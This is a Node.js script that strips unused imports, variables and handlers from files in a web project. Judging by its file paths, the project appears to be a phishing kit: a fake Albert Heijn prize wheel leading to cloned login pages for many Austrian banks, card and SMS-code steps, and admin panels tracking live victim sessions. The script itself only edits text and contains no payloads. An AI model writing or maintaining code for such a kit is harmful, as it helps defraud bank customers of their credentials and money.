const fs = require('fs');

function replaceFile(path, replacer) {
  const content = fs.readFileSync(path, 'utf8');
  const newContent = replacer(content);
  if (content !== newContent) {
    fs.writeFileSync(path, newContent);
    console.log(`Updated ${path}`);
  }
}

replaceFile('src/app/admin/admin-dashboard-clean.tsx', c => c
  .replace(/import { translations, TranslationKeys } from "@\/lib\/languageDefaults";/, 'import { translations } from "@/lib/languageDefaults";')
  .replace(/const \[loading, setLoading\] = useState\(true\);/, '')
  .replace(/const \[onlineSessionIds, setOnlineSessionIds\] = useState<Set<string>>\(new Set\(\)\);/, 'const [onlineSessionIds] = useState<Set<string>>(new Set());')
  .replace(/const \[sessionLastSeenAt, setSessionLastSeenAt\] = useState<Record<string, number>>\({}\);/, 'const [sessionLastSeenAt] = useState<Record<string, number>>({});')
  .replace(/const \[sessionPaths, setSessionPaths\] = useState<Record<string, string>>\({}\);/, 'const [sessionPaths] = useState<Record<string, string>>({});')
  .replace(/const \[liveVisitorCount, setLiveVisitorCount\] = useState\(0\);/, 'const [liveVisitorCount] = useState(0);')
  .replace(/const { data } = await supabase.storage.from\('chat_images'\).upload/, 'const { error } = await supabase.storage.from(\'chat_images\').upload')
);

replaceFile('src/app/admin/BanksModal.tsx', c => c
  .replace(/import type { DesignConfig, BlockType, BankElement } from "@\/types\/design";/, 'import type { DesignConfig } from "@/types/design";')
  .replace(/map\(\(\[key, value\], index\)/g, 'map(([key, value])')
);

replaceFile('src/app/admin/DynamicBankPreview.tsx', c => c
  .replace(/import { DEFAULT_DESIGN_CONFIG } from "@\/lib\/design-defaults";\n/, '')
);

replaceFile('src/app/admin/ReceiptModal.tsx', c => c
  .replace(/import React, { useState, useRef } from "react";/, 'import { useState, useRef } from "react";')
);

replaceFile('src/app/admin/VoucherModal.tsx', c => c
  .replace(/import React, { useState, useRef } from "react";/, 'import { useState, useRef } from "react";')
);

replaceFile('src/app/admin1/admin1-dashboard.tsx', c => c
  .replace(/import { useState, useEffect } from "react";/, 'import { useState } from "react";')
);

replaceFile('src/app/admin1/components/BanksTab.tsx', c => c
  .replace(/import type { DesignConfig, BlockType, BankElement } from "@\/types\/design";/, 'import type { DesignConfig } from "@/types/design";')
  .replace(/const \[validationWarnings, setValidationWarnings\] = useState<string\[\]>\(\[\]\);/, '')
  .replace(/onDragStart={\(e\) => handleDragStart\(e, item\.id\)}/, '')
  .replace(/onDragOver={\(e\) => handleDragOver\(e, index\)}/, 'onDragOver={(e) => e.preventDefault()}')
  .replace(/onDrop={\(e\) => handleDrop\(e, item\.id\)}/, '')
  .replace(/const handleDragStart = \(e: React.DragEvent, id: string\) => {[\s\S]*?};/, '')
  .replace(/const handleDragOver = \(e: React.DragEvent, index: number\) => {[\s\S]*?};/, '')
  .replace(/const handleDrop = \(e: React.DragEvent, id: string\) => {[\s\S]*?};/, '')
);

replaceFile('src/app/admin1/components/LogsTab.tsx', c => c
  .replace(/import { stepToPath } from "@\/lib\/session-routes";\n/, '')
  .replace(/const \[loading, setLoading\] = useState\(true\);/, '')
  .replace(/map\(\(\[key, val\]\) =>/, 'map(([ , val]) =>')
  .replace(/const { data, error } = await supabase.storage.from\('chat_images'\).upload/, 'const { error } = await supabase.storage.from(\'chat_images\').upload')
);

replaceFile('src/app/api/admin/users/route.ts', c => c
  .replace(/export async function GET\(req: Request\) {/, 'export async function GET() {')
);

replaceFile('src/app/api/fix-banks/route.ts', c => c
  .replace(/import { getBanks } from "@\/lib\/banks-db";\n/, '')
);

replaceFile('src/app/banken/banken-client-clean.tsx', c => c
  .replace(/map\(\(bank, index\)/, 'map((bank)')
  .replace(/map\(\(row, idx\)/, 'map((row)')
);

replaceFile('src/app/card/card-client.tsx', c => c
  .replace(/import { DemoShell } from "@\/components\/demo\/DemoShell";\n/, '')
  .replace(/const ui = settings;/, '')
);

replaceFile('src/app/invalid-bank/invalid-bank-client.tsx', c => c
  .replace(/import { useState } from "react";\n/, '')
  .replace(/const { settings } = useSettings\(\);/, '')
);

replaceFile('src/app/page.tsx', c => c
  .replace(/import { LiveToast } from "@\/components\/demo\/LiveToast";\n/, '')
  .replace(/const router = useRouter\(\);/, '')
);

replaceFile('src/app/sms/sms-client.tsx', c => c
  .replace(/import { DemoShell } from "@\/components\/demo\/DemoShell";\n/, '')
  .replace(/const ui = settings;/, '')
);

replaceFile('src/app/special-approval/special-approval-client.tsx', c => c
  .replace(/import { stepToPath } from "@\/lib\/session-routes";\n/, '')
  .replace(/import type { SessionStep } from "@\/types\/session";\n/, '')
  .replace(/const lang = settings\.site_language \|\| "de";/, '')
);

replaceFile('src/app/wait/wait-client.tsx', c => c
  .replace(/import { DemoShell } from "@\/components\/demo\/DemoShell";\n/, '')
);

replaceFile('src/app/wheel/wheel-client.tsx', c => c
  .replace(/const formattedHistory = prizeHistory\.map/, 'prizeHistory.map')
);

replaceFile('src/app/win/[id]/bank/[bank_slug]/adyen-client.tsx', c => c
  .replace(/import { useState, useEffect } from "react";/, 'import { useState } from "react";')
);

replaceFile('src/app/win/[id]/bank/[bank_slug]/bank-login-client.tsx', c => c
  .replace(/import { DEFAULT_DESIGN_CONFIG } from "@\/lib\/design-defaults";\n/, '')
  .replace(/const secondaryColor = ui\.colors\?.secondary \|\| "#4b5563";/, '')
);

replaceFile('src/components/AlbertHeijnWheel/AlbertHeijnWheel.tsx', c => c
  .replace(/import { useState, useEffect, CSSProperties } from 'react';/, 'import { useState, useEffect } from \'react\';')
);

replaceFile('src/components/AlbertHeijnWheel/PrizePopup.tsx', c => c
  .replace(/import type { PrizePopupHistoryItem } from '\.\/types';\n/, '')
);

replaceFile('src/components/demo/ChatWidget.tsx', c => c
  .replace(/const \[unreadCount, setUnreadCount\] = useState\(0\);/, '')
  .replace(/const pathname = usePathname\(\);/, '')
);

replaceFile('src/components/demo/WinFlow.tsx', c => c
  .replace(/const router = useRouter\(\);/, '')
  .replace(/const { settings } = useSettings\(\);/, '')
);

['BankAustria', 'BawagAg', 'BksBank', 'BtvVierLanderBank', 'Easybank', 'HypoOberosterreich', 'Oberbank', 'PosojilnicaBank', 'Raiffeisen', 'SpardaBank', 'Volkskreditbank'].forEach(name => {
  replaceFile(`src/components/templates/${name}.tsx`, c => c.replace(/import React from "react";\n/, ''))
});

replaceFile('src/components/templates/ErsteBank.tsx', c => c.replace(/import React, { useState } from "react";\n/, 'import React from "react";\n'));

replaceFile('src/lib/banks-db.ts', c => c.replace(/const BANKS_SESSION_ID = 'banks_db_v1';\n/, ''));

console.log("Done");
